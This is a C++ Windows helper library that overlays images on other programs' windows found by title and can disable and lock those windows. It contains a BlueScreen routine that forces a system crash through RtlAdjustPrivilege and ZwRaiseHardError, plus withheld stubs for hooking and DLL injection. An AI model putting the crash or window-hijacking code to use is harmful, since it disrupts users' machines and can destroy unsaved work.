#include "pch.h"
#include "basetool.cpp"

#include <atlconv.h>
#include <Windows.h>
#include <iostream>
#include <thread>
#include <vector>
#include <atlimage.h>

using namespace std;

#pragma comment(lib, "Msimg32.lib")
#define KEY_DOWN(VK_NONAME)((GetAsyncKeyState(VK_NONAME)&0x8000)?1:0)

static double scale = 1;

static int imgW = 853;

static int imgH = 480;

static BYTE back[12] = 0/*protect*/;

static BYTE hook[12] = 0/*protect*/;

template <typename T>T copy_v(const T& var) {
	T* new_var = new T;
	std::memcpy(new_var, &var, sizeof(T));
	return *new_var;
}

static bool IsMouseGrub() {
	CURSORINFO cursorInfo{};
	cursorInfo.cbSize = sizeof(cursorInfo);

	GetCursorInfo(&cursorInfo);

	return cursorInfo.flags == CURSOR_SHOWING;
}

static double GetScreenScale() {
	int screenW = ::GetSystemMetrics(SM_CXSCREEN);
	int screenH = ::GetSystemMetrics(SM_CYSCREEN);
	HWND hwd = ::GetDesktopWindow();
	HDC hdc = ::GetDC(hwd);
	int width = ::GetDeviceCaps(hdc, DESKTOPHORZRES);
	int height = ::GetDeviceCaps(hdc, DESKTOPVERTRES);
	double _scale = (double)width / screenW;
	return _scale;
}

static vector<HWND> AllWindow() {
	std::vector<HWND> hwnds;
	EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
		auto& hwnds = *reinterpret_cast<std::vector<HWND>*>(lParam);
		hwnds.push_back(hwnd);
		return TRUE;
		}, reinterpret_cast<LPARAM>(&hwnds));
	return hwnds;
}

static const wchar_t* _AllWindow_target = L"";
static vector<HWND> AllWindow(char* in) {
	USES_CONVERSION;
	_AllWindow_target = A2W(in);
	std::vector<HWND> hwnds;
	EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
		int textLen = GetWindowTextLengthW(hwnd);
		wchar_t* buffer = new wchar_t[textLen + 1];
		GetWindowTextW(hwnd, buffer, textLen + 1);
		if (StrIn(buffer, _AllWindow_target)) {
			auto& hwndsI = *reinterpret_cast<std::vector<HWND>*>(lParam);
			hwndsI.push_back(hwnd);
		}
		return TRUE;
		}, reinterpret_cast<LPARAM>(&hwnds));
	_AllWindow_target = L"";
	return hwnds;
}

static bool IsFullScreen(HWND hwnd) {
	RECT windowRect;
	GetWindowRect(hwnd, &windowRect);
	RECT desktopRect;
	const HWND hDesktop = GetDesktopWindow();
	GetWindowRect(hDesktop, &desktopRect);
	return (windowRect.left <= 0 && windowRect.top <= 0 && windowRect.right >= desktopRect.right && windowRect.bottom >= desktopRect.bottom);
}

static RECT _oldrect = { 0, 0, 0, 0 };
static bool IsResized(HWND hwnd) {
	RECT currentRect;
	GetWindowRect(hwnd, &currentRect);
	if (currentRect.right != _oldrect.right || currentRect.bottom != _oldrect.bottom) {
		_oldrect = currentRect;
		return true;
	}
	return false;
}

static void RenderFW(HWND hwnd, HDC hdc, HDC mdc, RECT rect, string mode) {
	if (mode == "SCREEN")hdc = GetDC(0);
	POINT point{};
	BLENDFUNCTION blendFunction;
	memset(&blendFunction, 0, sizeof(blendFunction));
	blendFunction.BlendOp = AC_SRC_OVER;
	blendFunction.SourceConstantAlpha = 1;// 0-255
	if (mode == "WINDOW") {
		while (true) {
			if (StretchBlt(hdc, 0, 0, rect.right * scale, rect.bottom * scale, mdc, 0, 0, imgW, imgH, SRCCOPY)) {
			}
		}
	}
	else if (mode == "SCREEN") {
		while (true) {
			point.x = 0;
			point.y = 0;
			ClientToScreen(hwnd, &point);
			StretchBlt(hdc, point.x * scale, point.y * scale, rect.right * scale, rect.bottom * scale, mdc, 0, 0, imgW, imgH, SRCCOPY);
		}
	}
}

static void RenderWHR(HWND hwnd, HDC hdc, HDC mdc, string mode, int x, int y, int w, int h) {
	if (mode == "SCREEN")hdc = GetDC(0);
	POINT point{};
	RECT rect = { 0, 0, 0, 0 };
	BLENDFUNCTION blendFunction;
	memset(&blendFunction, 0, sizeof(blendFunction));
	blendFunction.BlendOp = AC_SRC_OVER;
	blendFunction.SourceConstantAlpha = 1;// 0-255
	if (mode == "WINDOW") {
		while (true) {
			if (StretchBlt(hdc, x * scale, y * scale, w * scale, h * scale, mdc, 0, 0, imgW, imgH, SRCCOPY)) {
			}
		}
	}
	else if (mode == "SCREEN") {
		while (true) {
			point.x = 0;
			point.y = 0;
			ClientToScreen(hwnd, &point);
			StretchBlt(hdc, point.x * scale + x, point.y * scale + y, w * scale, h * scale, mdc, 0, 0, imgW, imgH, SRCCOPY);
		}
	}
}

static void HoldFW(HWND hwnd, HDC hdc, HDC mdc, string mode, bool lw) {
	RECT rect{ 0, 0, 0, 0 };
	if (!GetClientRect(hwnd, &rect)) {
		return;
	}
	for (int j = 0; j < 1; j++) {
		thread(RenderFW, hwnd, hdc, mdc, rect, mode).detach();
	}
	GetWindowRect(hwnd, &_oldrect);
	Sleep(10);
	while (true) {
		if (!GetClientRect(hwnd, &rect)) {
			break;
		}
		else {
			if (StretchBlt(hdc, 0, 0, rect.right * scale, rect.bottom * scale, mdc, 0, 0, imgW, imgH, SRCCOPY)) {

			}
			else {

			}
			if (IsResized(hwnd)) {
				LockWindowUpdate(NULL);
				if (StretchBlt(hdc, 0, 0, rect.right * scale, rect.bottom * scale, mdc, 0, 0, imgW, imgH, SRCCOPY)) {
				}
				UpdateWindow(hwnd);
				SendMessageW(hwnd, WM_SETREDRAW, TRUE, NULL);
				SendMessageW(hwnd, WM_PAINT, TRUE, NULL);
			}
			else {
				UpdateWindow(hwnd);
				SendMessageW(hwnd, WM_SETREDRAW, TRUE, NULL);
				SendMessageW(hwnd, WM_PAINT, TRUE, NULL);
				if (lw) {
					EnableWindow(hwnd, FALSE);
					LockWindowUpdate(hwnd);
				}
			}
		}
	}
}

static void HoldWHR(HWND hwnd, HDC hdc, HDC mdc, string mode, int x, int y, int w, int h, bool lw) {
	RECT rect{ 0, 0, 0, 0 };
	if (!GetClientRect(hwnd, &rect)) {
		return;
	}
	for (int j = 0; j < 1; j++) {
		thread(RenderWHR, hwnd, hdc, mdc, mode, x, y, w, h).detach();
	}
	GetWindowRect(hwnd, &_oldrect);
	Sleep(10);
	while (true) {
		if (!GetClientRect(hwnd, &rect)) {
			break;
		}
		if (StretchBlt(hdc, x * scale, y * scale, w * scale, h * scale, mdc, 0, 0, imgW, imgH, SRCCOPY)) {

		}
		else {

		}
		UpdateWindow(hwnd);
		SendMessageW(hwnd, WM_SETREDRAW, TRUE, NULL);
		SendMessageW(hwnd, WM_PAINT, TRUE, NULL);
		if (lw) {
			EnableWindow(hwnd, FALSE);
			LockWindowUpdate(hwnd);
		}
	}
}

static void Release(HDC mdc, HDC hdc, HBITMAP image, HWND Hwnd) {
	if (mdc) {
		DeleteDC(mdc);
		mdc = NULL;
	}
	if (image) {
		DeleteObject(image);
		image = NULL;
	}
	if (hdc) {
		ReleaseDC(Hwnd, hdc);
		hdc = NULL;
	}
}

static void GDIFW(char* m, bool lw, char* tw, char* img) {
	string mode(m);
	if (mode.empty()) {
		MessageBoxA(NULL, "UNKNOW -> \"MODE\"", "PLZAPI", NULL);
		return;
	}
	scale = GetScreenScale();
	vector<HWND> hwnds = AllWindow(tw);
	if (hwnds.empty()) {
		MessageBoxA(NULL, "NO HWND", "PLZAPI", NULL);
		return;
	}
	HWND hwnd = hwnds.at(0);
	CImage cimg;
	if (img == 0) {
		MessageBoxA(NULL, "NO IMG INPUT", "PLZAPI", NULL);
		return;
	}
	USES_CONVERSION;
	LPWSTR w = A2W(img);
	cimg.Load(w);
	HBITMAP image = (HBITMAP)LoadImageA(NULL, img, IMAGE_BITMAP, cimg.GetWidth(), cimg.GetHeight(), LR_LOADFROMFILE | LR_CREATEDIBSECTION);
	HDC hdc = GetDC(hwnd);
	HDC mdc = CreateCompatibleDC(hdc);
	if (!SelectObject(mdc, image)) {
		Release(hdc, mdc, image, hwnd);
		MessageBoxA(NULL, "IMAGE LOAD ERROR", "PLZAPI", NULL);
		return;
	}
	HoldFW(hwnd, hdc, mdc, mode, lw);
	Release(hdc, mdc, image, hwnd);
}

static void GDIWHR(char* m, bool lw, char* tw, char* img, int x, int y, int w, int h) {
	string mode(m);
	if (mode.empty()) {
		MessageBoxA(NULL, "UNKNOW -> \"MODE\"", "PLZAPI", NULL);
		return;
	}
	scale = GetScreenScale();
	vector<HWND> hwnds = AllWindow(tw);
	if (hwnds.empty()) {
		MessageBoxA(NULL, "NO HWND", "PLZAPI", NULL);
		return;
	}
	HWND hwnd = hwnds.at(0);
	HBITMAP image = (HBITMAP)LoadImageA(NULL, img, IMAGE_BITMAP, imgW, imgH, LR_LOADFROMFILE | LR_CREATEDIBSECTION);
	HDC hdc = GetDC(hwnd);
	HDC mdc = CreateCompatibleDC(hdc);
	if (!SelectObject(mdc, image) || !hwnd || !hdc || !mdc) {
		Release(hdc, mdc, image, hwnd);
		MessageBoxA(NULL, "INITIAL VALUES", "PLZAPI", NULL);
		return;
	}
	HoldWHR(hwnd, hdc, mdc, mode, x, y, w, h, lw);
	Release(mdc, hdc, image, hwnd);
}

static int MsgBox(char* msg, char* title, long t) {
	return MessageBoxA(NULL, msg, title, t);
}

static void BlueScreen() {
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (ntdll) {
		FARPROC RAP = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC ZRHError = GetProcAddress(ntdll, "ZwRaiseHardError");
		unsigned char EK;
		long unsigned int HE;
		((void(*)(DWORD, DWORD, bool, LPBYTE))RAP)(0x13, true, false, &EK);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZRHError)(1145141919810U, 0, 0, 0, 6, &HE);
	}
}

static FARPROC FromDLL(char* dllp, char* procn) {
	HMODULE dll = LoadLibraryA(dllp);
	if (dll) {
		FARPROC proc = GetProcAddress(dll, procn);
		return proc;
	}
	throw new exception("No dll or proc");
}

static auto EmptyFunc() {
	return 0;
}

static void Hook(void* scr, void* dst)
{
	/*PROTECT*/
}

static void UnHook(void* scr)
{
	/*PROTECT*/
}

static void Inject(char* dllp, DWORD processid)
{
	/*PROTECT*/
}
